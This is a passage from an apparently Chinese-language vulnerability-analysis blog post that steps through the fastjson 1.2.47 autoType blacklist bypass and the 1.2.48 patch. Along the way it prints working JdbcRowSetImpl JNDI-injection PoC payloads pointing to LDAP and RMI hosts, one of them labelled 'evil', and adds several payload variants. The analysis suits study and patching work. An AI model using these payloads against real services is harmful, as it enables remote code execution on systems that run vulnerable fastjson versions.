class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>由以上代码可知，这里存在一个逻辑问题：<mark><strong>autoTypeSupport 为 true 时</strong></mark>，fastjson 也会禁止一些黑名单的类反序列化，但是有一个判断条件：当反序列化的类在黑名单中，且 TypeUtils.mappings 中没有该类的缓存时，才会抛出异常。这里就留下了一个伏笔。就是这个逻辑导致了 <strong>1.2.32</strong> 之前的版本将会受到 <code>autoTypeSupport</code>​ 的影响。</p><p>在 <mark><strong>autoTypeSupport 为默认的 false 时</strong></mark>，程序直接检查黑名单并抛出异常，在这部分我们无法绕过，所以我们的关注点就在判断之前。程序有在 TypeUtils.mappings 中和 deserializers 中尝试查找要反序列化的类，如果找到了，则就会 return，这就避开下面 autoTypeSupport 默认为 false 时的检查。</p><blockquote><p>如何才能在这两步中将我们的恶意类加载进去呢？</p></blockquote><p>先看 deserializers ，位于 <code>com.alibaba.fastjson.parser.ParserConfig.deserializers</code>​ ，是一个 IdentityHashMap，能向其中赋值的函数有：</p><ul><li>​<code>getDeserializer()</code>​：这个类用来加载一些特定类，以及有 <code>JSONType</code>​ 注解的类，在 put 之前都有类名及相关信息的判断，无法为我们所用。</li><li>​<code>initDeserializers()</code>​：无入参，在构造方法中调用，写死一些认为没有危害的固定常用类，无法为我们所用。</li><li>​<code>putDeserializer()</code>​：被前两个函数调用，我们无法控制入参。</li></ul><p>因此我们无法向 deserializers 中写入值，也就在其中读出我们想要的恶意类。所以我们的目光转向了 <code>TypeUtils.getClassFromMapping(typeName)</code>​。</p><p>同样的，这个方法从 <code>TypeUtils.mappings</code>​ 中取值，这是一个 ConcurrentHashMap 对象，能向其中赋值的函数有：</p><ul><li>​<code>addBaseClassMappings()</code>​：无入参，加载</li><li>​<code>loadClass()</code>​：关键函数</li></ul><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> <span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> className<span class="token punctuation">,</span> <span class="token class-name">ClassLoader</span> classLoader<span class="token punctuation">,</span> <span class="token keyword">boolean</span> cache<span class="token punctuation">)</span> <span class="token punctuation">{</span>\n        <span class="token comment">// 非空判断</span>\n        <span class="token keyword">if</span><span class="token punctuation">(</span>className <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> className<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>\n            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n        <span class="token comment">// 防止重复添加</span>\n        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> clazz <span class="token operator">=</span> mappings<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token keyword">if</span><span class="token punctuation">(</span>clazz <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>\n            <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n        <span class="token comment">// 判断 className 是否以 [ 开头</span>\n        <span class="token keyword">if</span><span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token char">&#39;[&#39;</span><span class="token punctuation">)</span><span class="token punctuation">{</span>\n            <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> componentType <span class="token operator">=</span> <span class="token function">loadClass</span><span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> classLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>\n            <span class="token keyword">return</span> <span class="token class-name">Array</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>componentType<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n        <span class="token comment">// 判断 className 是否 L 开头 ; 结尾</span>\n        <span class="token keyword">if</span><span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">&quot;L&quot;</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> className<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">&quot;;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>\n            <span class="token class-name">String</span> newClassName <span class="token operator">=</span> className<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> className<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n            <span class="token keyword">return</span> <span class="token function">loadClass</span><span class="token punctuation">(</span>newClassName<span class="token punctuation">,</span> classLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n        <span class="token keyword">try</span><span class="token punctuation">{</span>\n            <span class="token comment">// 如果 classLoader 非空，cache 为 true 则使用该类加载器加载并存入 mappings 中</span>\n            <span class="token keyword">if</span><span class="token punctuation">(</span>classLoader <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>\n                clazz <span class="token operator">=</span> classLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>\n                <span class="token keyword">if</span> <span class="token punctuation">(</span>cache<span class="token punctuation">)</span> <span class="token punctuation">{</span>\n                    mappings<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> clazz<span class="token punctuation">)</span><span class="token punctuation">;</span>\n                <span class="token punctuation">}</span>\n                <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>\n            <span class="token punctuation">}</span>\n        <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Throwable</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>\n            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n            <span class="token comment">// skip</span>\n        <span class="token punctuation">}</span>\n        <span class="token comment">// 如果失败，或没有指定 ClassLoader ，则使用当前线程的 contextClassLoader 来加载类，也需要 cache 为 true 才能写入 mappings 中</span>\n        <span class="token keyword">try</span><span class="token punctuation">{</span>\n            <span class="token class-name">ClassLoader</span> contextClassLoader <span class="token operator">=</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n            <span class="token keyword">if</span><span class="token punctuation">(</span>contextClassLoader <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> contextClassLoader <span class="token operator">!=</span> classLoader<span class="token punctuation">)</span><span class="token punctuation">{</span>\n                clazz <span class="token operator">=</span> contextClassLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>\n                <span class="token keyword">if</span> <span class="token punctuation">(</span>cache<span class="token punctuation">)</span> <span class="token punctuation">{</span>\n                    mappings<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> clazz<span class="token punctuation">)</span><span class="token punctuation">;</span>\n                <span class="token punctuation">}</span>\n                <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>\n            <span class="token punctuation">}</span>\n        <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Throwable</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>\n            <span class="token comment">// skip</span>\n        <span class="token punctuation">}</span>\n        <span class="token comment">// 如果还是失败，则使用 Class.forName 来获取 class 对象并放入 mappings 中</span>\n        <span class="token keyword">try</span><span class="token punctuation">{</span>\n            clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>\n            mappings<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> clazz<span class="token punctuation">)</span><span class="token punctuation">;</span>\n            <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>\n        <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Throwable</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>\n            <span class="token comment">// skip</span>\n        <span class="token punctuation">}</span>\n        <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>由以上代码可知，只要我们能够控制这个方法的参数，就可以往 mappings 中写入任意类名。 <code>loadClass</code>​ 一共有三个重载方法，如下图：</p><p>​<img src="'+o+'" alt="image" loading="lazy">​</p><p>需要找到调用这些方法的类，并看是否能够为我们控制：</p><ul><li>​<code>Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, boolean cache)</code>​：调用链均在 <code>checkAutoType()</code>​ 和 <code>TypeUtils</code>​ 里自调用，略过。</li><li>​<code>Class&lt;?&gt; loadClass(String className)</code>​：除了自调用，有一个 <code>castToJavaBean()</code>​ 方法，暂未研究。</li><li>​<code>Class&lt;?&gt; loadClass(String className, ClassLoader classLoader)</code>​：方法调用三个参数的重载方法，并添加参数 true ，也就是会加入参数缓存中，</li></ul><h3 id="不受-autotypesupport-影响的版本" tabindex="-1"><a class="header-anchor" href="#不受-autotypesupport-影响的版本"><span>不受 AutoTypeSupport 影响的版本</span></a></h3><p>不受 AutoTypeSupport 影响的版本为 1.2.33-1.2.47，本次调试的是 1.2.47 版本。</p><h4 id="未开启-autotypesupport-时" tabindex="-1"><a class="header-anchor" href="#未开启-autotypesupport-时"><span>未开启 AutoTypeSupport 时</span></a></h4><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">demo</span><span class="token punctuation">;</span>\n\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>\n\n<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JdbcRowSetImplPoc</span> <span class="token punctuation">{</span>\n    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span><span class="token punctuation">{</span>\n        <span class="token comment">//ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span>\n        <span class="token class-name">String</span> payload  <span class="token operator">=</span> <span class="token string">&quot;{\\&quot;a\\&quot;:{\\&quot;@type\\&quot;:\\&quot;java.lang.Class\\&quot;,\\&quot;val\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;},&quot;</span>\n                <span class="token operator">+</span> <span class="token string">&quot;\\&quot;b\\&quot;:{\\&quot;@type\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;,&quot;</span>\n                <span class="token operator">+</span> <span class="token string">&quot;\\&quot;dataSourceName\\&quot;:\\&quot;ldap://localhost:1389/Exploit\\&quot;,\\&quot;autoCommit\\&quot;:true}}&quot;</span><span class="token punctuation">;</span>\n        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n<span class="token punctuation">}</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在调用 <code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject</code>​ 函数时，其会对 JSON 数据进行循环遍历扫描解析。</p><p>【<strong>第一次扫描解析】</strong></p><p>在 <code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject</code>​ 进行 json 的数据处理，一直走到这个判断继续调用自己进行数据处理。</p><p>​<img src="'+e+'" alt="image" loading="lazy">​</p><p>处理 <code>@type</code>​ 的时候会进行 <code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType</code>​ 函数，由于未开启 AutoTypeSupport，因此不会进入黑白名单校验的逻辑。<code>@type</code>​ 执行了 <code>java.lang.Class</code>​ 类，该类在接下来的 <code>findClass()</code>​ 函数中直接被找到，并在后面的 if 判断 clazz 不为空后直接返回。</p><p>​<img src="'+c+'" alt="image" loading="lazy">​</p><p>​<img src="'+l+'" alt="image" loading="lazy">​</p><p>返回后往下调试，调用到 <code>com.alibaba.fastjson.serializer.MiscCodec#deserialze</code>​，其中判断键是否为 &quot;val&quot;，是的话再提取 val 键对应的值赋给 objVal 变量，而 objVal 在后面会赋值给 strVal 变量。</p><p>​<img src="'+i+'" alt="image" loading="lazy">​</p><p>​<img src="'+u+'" alt="image" loading="lazy">​</p><p>接着判断 clazz 是否为 Class 类，是的话调用 <code>TypeUtils.loadClass()</code>​ 加载 strVal 变量值指向的类。</p><p>​<img src="'+r+'" alt="image" loading="lazy">​</p><p>在 <code>com.alibaba.fastjson.util.TypeUtils#loadClass</code>​ 函数中，成功加载 <code>com.sun.rowset.JdbcRowSetImpl</code>​ 类后，就会将其缓存在 Map 中。</p><p>​<img src="'+k+'" alt="image" loading="lazy">​</p><p>​<img src="'+d+'" alt="image" loading="lazy">​</p><hr><p>【<strong>第二次扫描解析】</strong></p><p>​<img src="'+m+'" alt="image" loading="lazy">​</p><p>继续 <code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject</code>​，继续处理 b 这个 key 以及它的 <code>@type</code>​。</p><p>​<img src="'+v+'" alt="image" loading="lazy">​</p><p>​<img src="'+g+'" alt="image" loading="lazy">​</p><p>在 <code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType</code>​ 时，由于前面第一部分 JSON 数据中的 val 键值 &quot;<code>com.sun.rowset.JdbcRowSetImpl</code>​&quot; 已经缓存到 Map 中了，所以当此时调用 <code>TypeUtils.getClassFromMapping()</code>​ 时能够成功从 Map 中获取到缓存的类，进而在下面的判断 clazz 是否为空的 if 语句中直接 return 返回了。</p><p>​<img src="'+b+'" alt="image" loading="lazy">​</p><p>之后就是和第一次一样的流程了。</p><p>​<img src="'+y+'" alt="image" loading="lazy">​</p><h4 id="开启-autotypesupport-时" tabindex="-1"><a class="header-anchor" href="#开启-autotypesupport-时"><span>开启 AutoTypeSupport 时</span></a></h4><p>由上面调试可知开启 AutoTypeSupport 后，在 <code>checkAutoType()</code>​ 函数中会进入黑白名单校验的代码逻辑。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">demo</span><span class="token punctuation">;</span>\n\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">ParserConfig</span></span><span class="token punctuation">;</span>\n\n<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JdbcRowSetImplPoc</span> <span class="token punctuation">{</span>\n    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span><span class="token punctuation">{</span>\n        <span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token class-name">String</span> payload  <span class="token operator">=</span> <span class="token string">&quot;{\\&quot;a\\&quot;:{\\&quot;@type\\&quot;:\\&quot;java.lang.Class\\&quot;,\\&quot;val\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;},&quot;</span>\n                <span class="token operator">+</span> <span class="token string">&quot;\\&quot;b\\&quot;:{\\&quot;@type\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;,&quot;</span>\n                <span class="token operator">+</span> <span class="token string">&quot;\\&quot;dataSourceName\\&quot;:\\&quot;ldap://localhost:1389/Exploit\\&quot;,\\&quot;autoCommit\\&quot;:true}}&quot;</span><span class="token punctuation">;</span>\n        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n<span class="token punctuation">}</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>【<strong>第一次扫描解析】</strong></p><p>在第一部分 JSON 数据的扫描解析中，由于 <code>@type</code>​ 指向 <code>java.lang.Class</code>​，因此即使是开启 AutoTypeSupport 先后进行白名单、黑名单校验的情况下都能成功通过检测，之后和前面的一样调用 <code>deserializers.findClass()</code>​ 函数获取到 Class 类。</p><p>​<img src="'+q+'" alt="image" loading="lazy">​</p><hr><p>【<strong>第二次扫描解析】</strong></p><p>关键在于第二部分 JSON 数据的扫描解析。第二部分的 <code>@type</code>​ 指向的是利用类 <code>com.sun.rowset.JdbcRowSetImpl</code>​，其中的 <code>com.sun.</code>​ 是在 denyList 黑名单中的，但是为何在检测时能成功绕过呢？</p><p>调试发现，逻辑是先进行白名单再进行黑名单校验，在黑名单校验的 if 判断条件中存在两个必须同时满足的条件。</p><p>​<img src="'+f+'" alt="image" loading="lazy">​</p><ul><li>第一个判断条件 <code>Arrays.binarySearch(denyHashCodes, hash) &gt;= 0</code>​ 是满足的，因为我们的 <code>@type</code>​ 包含了黑名单的内容</li><li>关键在于第二个判断条件 <code>TypeUtils.getClassFromMapping(typeName) == null</code>​，这里由于前面已经将 <code>com.sun.rowset.JdbcRowSetImpl</code>​ 类缓存在 Map 中了，也就是说该条件并不满足，导致能够成功绕过黑名单校验、成功触发漏洞。</li></ul><p>之后通过 <code>TypeUtils.getClassFromMapping()</code>​ 时能够成功从 Map 中获取到缓存的类，进而在下面的判断 clazz 是否为空的 if 语句中直接 return 返回了。</p><hr><h3 id="受-autotypesupport-影响的版本" tabindex="-1"><a class="header-anchor" href="#受-autotypesupport-影响的版本"><span>受 AutoTypeSupport 影响的版本</span></a></h3><p>受 AutoTypeSupport 影响的版本为 1.2.25-1.2.32，本次调试的是 1.2.32 版本。</p><h4 id="开启-autotypesupport-时-1" tabindex="-1"><a class="header-anchor" href="#开启-autotypesupport-时-1"><span>开启 AutoTypeSupport 时</span></a></h4><p>我们在开启 AutoTypeSupport 之后，会利用失败，报如下错。</p><p>​<img src="'+h+'" alt="image" loading="lazy">​</p><p>【<strong>第一次扫描解析】</strong></p><p>调试发现，在第一部分 JSON 数据的解析中，<code>checkAutoType()</code>​ 函数的处理过程和前面是差不多的。能够成功通过该函数的检测，因此问题不在这，继续往下调试。</p><p>​<img src="'+w+'" alt="image" loading="lazy">​</p><p>​<img src="'+j+'" alt="image" loading="lazy">​</p><hr><p>【<strong>第二次扫描解析】</strong></p><p>在第二部分 JSON 数据的解析中，<code>@type</code>​ 指向的 <code>com.sun.rowset.JdbcRowSetImpl</code>​ 在 <code>checkAutoType()</code>​ 函数中会被 dentList 黑名单中的 &quot;<code>com.sun.</code>​&quot; 匹配到，因此会直接报错显示不支持。</p><p>​<img src="'+C+'" alt="image" loading="lazy">​</p><h4 id="未开启-autotypesupport-时-1" tabindex="-1"><a class="header-anchor" href="#未开启-autotypesupport-时-1"><span>未开启 AutoTypeSupport 时</span></a></h4><p><mark>当不开启 AutoTypeSupport 时就</mark>​==<strong>不会进入该黑白名单校验</strong><mark>​</mark>的代码逻辑中，就不会被过滤报错。==</p><p>这里，我们换个不受 AutoTypeSupport 影响的且未使用哈希黑名单的版本来方便我们进行对比查看，这里选了 1.2.33，看下 <code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType</code>​ 中对应的代码。</p><p>对比黑名单校验的 if 判断语句条件就知道了，为什么后面的版本不受影响，那是因为通过 <code>&amp;&amp;</code>​ 多添加了一个判断条件 <code>TypeUtils.getClassFromMapping(typeName) == null</code>​，但是第二部分 JSON 内容中的类已经通过第一部分解析的时候加载到 Map 中缓存了，因此该条件不成立从而成功绕过。</p><p>​<img src="'+S+'" alt="image" loading="lazy">​</p><h3 id="其他混淆形式-poc" tabindex="-1"><a class="header-anchor" href="#其他混淆形式-poc"><span>其他混淆形式 POC</span></a></h3><div class="language-json line-numbers-mode" data-ext="json" data-title="json"><pre class="language-json"><code><span class="token comment">// ======== 形式 2</span>\nString payload = <span class="token string">&quot;[{\\&quot;@type\\&quot;:\\&quot;java.lang.Class\\&quot;,\\&quot;val\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;},{\\&quot;@type\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;,\\&quot;dataSourceName\\&quot;:\\&quot;ldap://localhost:1389/Exploit\\&quot;,\\&quot;autoCommit\\&quot;:true}]&quot;</span>;\nJSON.parseObject(payload);\n\n<span class="token comment">// ======== 形式 3</span>\nString payload = <span class="token string">&quot;{\\n&quot;</span> +\n                <span class="token string">&quot;    \\&quot;name\\&quot;:{\\n&quot;</span> +\n                <span class="token string">&quot;        \\&quot;@type\\&quot;:\\&quot;java.lang.Class\\&quot;,\\n&quot;</span> +\n                <span class="token string">&quot;        \\&quot;val\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;\\n&quot;</span> +\n                <span class="token string">&quot;    },\\n&quot;</span> +\n                <span class="token string">&quot;    \\&quot;x\\&quot;:{\\n&quot;</span> +\n                <span class="token string">&quot;        \\&quot;@type\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;,\\n&quot;</span> +\n                <span class="token string">&quot;        \\&quot;dataSourceName\\&quot;:\\&quot;ldap://localhost:1389/Exploit\\&quot;,\\n&quot;</span> +\n                <span class="token string">&quot;        \\&quot;autoCommit\\&quot;:true\\n&quot;</span> +\n                <span class="token string">&quot;    }\\n&quot;</span> +\n                <span class="token string">&quot;}&quot;</span>;\n\n<span class="token comment">// ======== 形式 4</span>\n<span class="token punctuation">{</span>\n    <span class="token property">&quot;name&quot;</span><span class="token operator">:</span><span class="token punctuation">{</span>\n        <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;java.lang.Class&quot;</span><span class="token punctuation">,</span>\n        <span class="token property">&quot;val&quot;</span><span class="token operator">:</span><span class="token string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>\n    <span class="token punctuation">}</span><span class="token punctuation">,</span>\n    <span class="token property">&quot;f&quot;</span><span class="token operator">:</span><span class="token punctuation">{</span>\n        <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="token punctuation">,</span>\n        <span class="token property">&quot;dataSourceName&quot;</span><span class="token operator">:</span><span class="token string">&quot;rmi://10.165.93.31:1090/evil&quot;</span><span class="token punctuation">,</span>\n        <span class="token property">&quot;autoCommit&quot;</span><span class="token operator">:</span><span class="token string">&quot;true&quot;</span>\n    <span class="token punctuation">}</span>\n<span class="token punctuation">}</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_1-2-48-补丁分析" tabindex="-1"><a class="header-anchor" href="#_1-2-48-补丁分析"><span>1.2.48 补丁分析</span></a></h2><p>1.2.48 中的修复措施是，在 <code>loadClass()</code>​ 时，<mark>将缓存开关默认置为 False</mark>。所以默认是不能通过 Class 加载进缓存了，同时将 Class 类加入到了黑名单中。</p><p><strong>【开启 AutoTypeSupport】</strong></p><p>无法通过黑名单检查。</p><p>​<img src="'+z+'" alt="image" loading="lazy">​</p><p>​<img src="'+x+'" alt="image" loading="lazy">​</p><hr><p><strong>【关闭</strong> <strong>AutoTypeSupport】</strong></p><p>​<img src="'+N+'" 